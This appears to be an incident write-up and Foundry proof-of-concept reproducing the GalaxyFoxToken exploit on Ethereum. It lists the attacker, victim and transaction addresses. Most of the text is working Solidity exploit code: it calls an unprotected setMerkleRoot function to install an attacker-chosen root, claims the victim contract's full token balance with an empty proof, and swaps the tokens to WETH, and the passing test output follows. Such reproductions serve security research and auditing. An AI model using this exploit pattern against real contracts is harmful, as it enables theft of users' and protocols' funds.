# GalaxyFoxToken Attack Incident

## Information
+ Protocol Name: GalaxyFoxToken
+ Total Loss: 330K
+ Network: Ethereum Mainnet
  
+ Attacker: 0xFcE19F8f823759b5867ef9a5055A376f20c5E454
+ Attack Contract: 0x86C68d9e13d8d6a70b6423CEB2aEdB19b59F2AA5
+ Victim Contract: 0x47c4b3144de2c87a458d510c0c0911d1903d1686
+ Transaction: 0x12fe79f1de8aed0ba947cec4dce5d33368d649903cb45a5d3e915cc459e751fc

## Reproduction
1. Add funding token and configure block number:

```solidity
uint256 constant forkBlock = 19_835_924;
address constant fundToken = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
```

2. Add constant variable:

```solidity
address constant GFOX = 0x8F1CecE048Cade6b8a05dFA2f90EE4025F4F2662;
address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant Victim = 0x11A4a5733237082a6C08772927CE0a2B5f8A86B6;
address constant Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
```

3. Add label in `setup` function
```solidity
vm.label(GFOX, "GFOX");
vm.label(WETH, "WETH");
vm.label(Victim, "Victim");
vm.label(Router, "Router");
```

4. Add necessary interface for victim contract
```solidity
interface IVictim {
    function setMerkleRoot(bytes32 _merkleRoot) external;
    function claim(address to, uint256 amount, bytes32[] calldata proof) external;
}
```

5. Execute exploit process:
```solidity
// Step 1: Call unprotected `setMerkleRoot` function
uint256 victimGFoxTokenAmount = IERC20(GFOX).balanceOf(Victim);
bytes32 root = keccak256(abi.encodePacked(address(this), victimGFoxTokenAmount));
IVictim(Victim).setMerkleRoot(root);

// Step 2: Claim tokens
IVictim(Victim).claim(address(this), victimGFoxTokenAmount, new bytes32[](0));
```

6. Execute post attack handling:
```solidity
// Swap GFOX token to WETH
uint256 amountIn = IERC20(GFOX).balanceOf(address(this));
uint256 amountOutMin = 0;
address[] memory path = new address[](2);
path[0] = GFOX;
path[1] = WETH;
address to = address(this);
uint256 deadline = block.timestamp;

IERC20(GFOX).approve(Router, amountIn);
IUniswapV2Router(Router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
    amountIn, amountOutMin, path, to, deadline
);
```

7. Run forge command and check the final result:

Command
```bash
forge test --mc GalaxyFoxTokenTest -vvv
```

Result
```bash
Ran 1 test for test/GalaxyFoxToken/PoC.t.sol:GalaxyFoxTokenTest
[PASS] testExploit() (gas: 252808)
Logs:
  Attacker Token Balance Before Exploit:  0
  amountToClaim 1335339824388750000000000000
  Attacker Token Balance After Exploit:  108744009594558929771

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 606.11ms (1.90ms CPU time)
```